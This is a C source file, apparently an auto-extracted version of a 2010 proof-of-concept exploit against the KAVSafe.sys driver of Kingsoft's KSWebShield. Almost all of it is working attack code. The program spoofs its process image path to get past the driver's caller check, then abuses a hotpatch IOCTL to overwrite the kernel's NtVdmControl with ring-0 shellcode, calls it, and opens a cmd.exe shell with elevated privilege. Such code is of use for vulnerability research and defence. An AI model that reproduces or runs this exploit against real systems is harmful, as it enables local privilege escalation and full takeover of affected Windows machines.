
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_14__ TYPE_6__ ;
typedef struct TYPE_13__ TYPE_5__ ;
typedef struct TYPE_12__ TYPE_4__ ;
typedef struct TYPE_11__ TYPE_3__ ;
typedef struct TYPE_10__ TYPE_2__ ;
typedef struct TYPE_9__ TYPE_1__ ;


typedef int sysmod ;
typedef int pbi ;
struct TYPE_12__ {TYPE_3__* Module; } ;
typedef TYPE_4__ X_SYSTEM_MODULE_INFORMATION ;
typedef char WCHAR ;
typedef int USHORT ;
typedef int ULONG ;
struct TYPE_14__ {TYPE_2__* ProcessParameters; } ;
struct TYPE_13__ {scalar_t__ PebBaseAddress; } ;
struct TYPE_11__ {int ImageName; } ;
struct TYPE_9__ {int Length; char* Buffer; } ;
struct TYPE_10__ {TYPE_1__ ImagePathName; } ;
typedef scalar_t__ PVOID ;
typedef TYPE_5__ PROCESS_BASIC_INFORMATION ;
typedef TYPE_6__* PPEB ;
typedef int (* PNT_VDM_CONTROL ) (int ,int ) ;
typedef int (* PNT_QUERY_SYSTEM_INFORMATION ) (int,TYPE_4__*,int,int *) ;
typedef int (* PNT_QUERY_INFORMATION_PROCESS ) (int ,int ,TYPE_5__*,int,int *) ;
typedef int ModuleName ;
typedef int LPBYTE ;
typedef scalar_t__ HMODULE ;
typedef int HKEY ;
typedef scalar_t__ HANDLE ;
typedef int DWORD ;
typedef char CHAR ;


 int CloseHandle (scalar_t__) ;
 int CopyMemory (scalar_t__,scalar_t__,int) ;
 scalar_t__ CreateFile (char*,int ,int ,int ,int ,int ,int ) ;
 int DeviceIoControl (scalar_t__,int ,scalar_t__,int,int *,int ,int*,int ) ;
 scalar_t__ ERROR_SUCCESS ;
 int FILE_READ_ATTRIBUTES ;
 int FILE_SHARE_READ ;
 int GetLastError () ;
 scalar_t__ GetModuleHandle (char*) ;
 scalar_t__ GetProcAddress (scalar_t__,char*) ;
 int HKEY_LOCAL_MACHINE ;
 scalar_t__ INVALID_HANDLE_VALUE ;
 int IOCTL_HOTPATCH_KERNEL_MODULE ;
 scalar_t__ LoadLibrary (scalar_t__) ;
 int MAX_PATH ;
 scalar_t__ NopNop ;
 int NtCurrentProcess () ;
 int OPEN_EXISTING ;
 scalar_t__ R0ShellCodeXP ;
 int RegCloseKey (int ) ;
 scalar_t__ RegOpenKey (int ,char*,int *) ;
 scalar_t__ RegQueryValueExW (int ,char*,int *,int*,int ,int*) ;
 int RtlCopyMemory (scalar_t__,char*,int) ;
 int SW_SHOW ;
 int WinExec (char*,int ) ;
 int getchar () ;
 scalar_t__ malloc (int) ;
 int printf (char*,...) ;
 scalar_t__ strrchr (int ,char) ;
 int wcscat (char*,char*) ;
 int wcslen (char*) ;

int main(int argc, char* argv[])
{

printf("KSWebShield KAVSafe.sys <= 2010,04,14,609\n"
"Kernel Mode Privilege Escalation Vulnerability Proof-of-Concept\n"
"2010-5-23\n"
"By Lincoin \n\nPress Enter");
HKEY hkey ;
WCHAR InstallPath[MAX_PATH];
DWORD datatype ;
DWORD datasize = MAX_PATH * sizeof(WCHAR);
ULONG oldlen ;
PVOID pOldBufferData = ((void*)0) ;

if (RegOpenKey(HKEY_LOCAL_MACHINE , "SOFTWARE\\Kingsoft\\KSWSVC", &hkey) == ERROR_SUCCESS)
{
if (RegQueryValueExW(hkey , L"ProgramPath" , ((void*)0) , &datatype , (LPBYTE)InstallPath , &datasize) != ERROR_SUCCESS)
{
RegCloseKey(hkey);
printf("KSWebShield not installed\n");
getchar();
return 0 ;
}

RegCloseKey(hkey);
}
else
{
printf("KSWebShield not installed\n");
getchar();
return 0 ;
}
wcscat(InstallPath , L"\\kavinst.exe");


PROCESS_BASIC_INFORMATION pbi ;

PNT_QUERY_INFORMATION_PROCESS pNtQueryInformationProcess ;
pNtQueryInformationProcess = (PNT_QUERY_INFORMATION_PROCESS)GetProcAddress(GetModuleHandle("ntdll.dll" ) , "NtQueryInformationProcess");
pNtQueryInformationProcess(NtCurrentProcess() , 0 , &pbi , sizeof(pbi) , ((void*)0));

PPEB peb ;

peb = (PPEB)pbi.PebBaseAddress;
oldlen = peb->ProcessParameters->ImagePathName.Length;
peb->ProcessParameters->ImagePathName.Length = wcslen(InstallPath) * sizeof(WCHAR);
pOldBufferData = malloc(peb->ProcessParameters->ImagePathName.Length);
RtlCopyMemory(pOldBufferData,peb->ProcessParameters->ImagePathName.Buffer , peb->ProcessParameters->ImagePathName.Length);
RtlCopyMemory(peb->ProcessParameters->ImagePathName.Buffer , InstallPath ,peb->ProcessParameters->ImagePathName.Length );
HANDLE hdev = CreateFile("\\\\.\\KAVSafe" ,
FILE_READ_ATTRIBUTES ,
FILE_SHARE_READ ,
0,
OPEN_EXISTING ,
0,
0);

if (hdev==INVALID_HANDLE_VALUE)
{
printf("cannot open device %u\n", GetLastError());
getchar();
return 0 ;
}
RtlCopyMemory(peb->ProcessParameters->ImagePathName.Buffer , pOldBufferData,peb->ProcessParameters->ImagePathName.Length);
peb->ProcessParameters->ImagePathName.Length = (USHORT)oldlen ;

PNT_QUERY_SYSTEM_INFORMATION pNtQuerySystemInformation ;
pNtQuerySystemInformation = (PNT_QUERY_SYSTEM_INFORMATION)GetProcAddress(GetModuleHandle("ntdll.dll") , "NtQuerySystemInformation");
X_SYSTEM_MODULE_INFORMATION sysmod ;
HMODULE KernelHandle ;

pNtQuerySystemInformation(0xb, &sysmod, sizeof(sysmod), ((void*)0));
    KernelHandle = LoadLibrary(strrchr(sysmod.Module[0].ImageName, '\\') + 1);
if (KernelHandle == 0 )
{
printf("cannot load ntoskrnl!\n");
getchar();
return 0 ;
}
PVOID pNtVdmControl = GetProcAddress(KernelHandle , "NtVdmControl");

if (pNtVdmControl == 0 )
{
printf("cannot find NtVdmControl!\n");
getchar();
return 0 ;
}
pNtVdmControl = (PVOID)((ULONG)pNtVdmControl - (ULONG)KernelHandle );

printf("NtVdmControl = %08x" , pNtVdmControl );
getchar();
ULONG ShellCodeSize = (ULONG)NopNop - (ULONG)R0ShellCodeXP;
ULONG pShellCode = (ULONG)R0ShellCodeXP;


PVOID Data = malloc(0x48 + ShellCodeSize);

CopyMemory((PVOID)((ULONG)Data + 0x48) , R0ShellCodeXP , ShellCodeSize);
CHAR ModuleName[68]= "ntoskrnl.exe" ;
RtlCopyMemory( Data , ModuleName , sizeof(ModuleName));
*(ULONG*)((ULONG)Data + 64) = (ULONG)pNtVdmControl;
*(ULONG*)((ULONG)Data + 68) = ShellCodeSize ;
ULONG btr ;
if (!DeviceIoControl(hdev ,
IOCTL_HOTPATCH_KERNEL_MODULE ,
Data ,
0x48 + ShellCodeSize ,
((void*)0) ,
0,
&btr , 0
))
{
printf("cannot device io control!%u\n" , GetLastError());
getchar();
return 0;
}

CloseHandle(hdev);

PNT_VDM_CONTROL pR3NtVdmControl = (PNT_VDM_CONTROL)GetProcAddress(GetModuleHandle("ntdll.dll") , "NtVdmControl");
pR3NtVdmControl(0,0);
WinExec("cmd.exe" , SW_SHOW);
printf("OK!\n ");

getchar();

return 0;
}
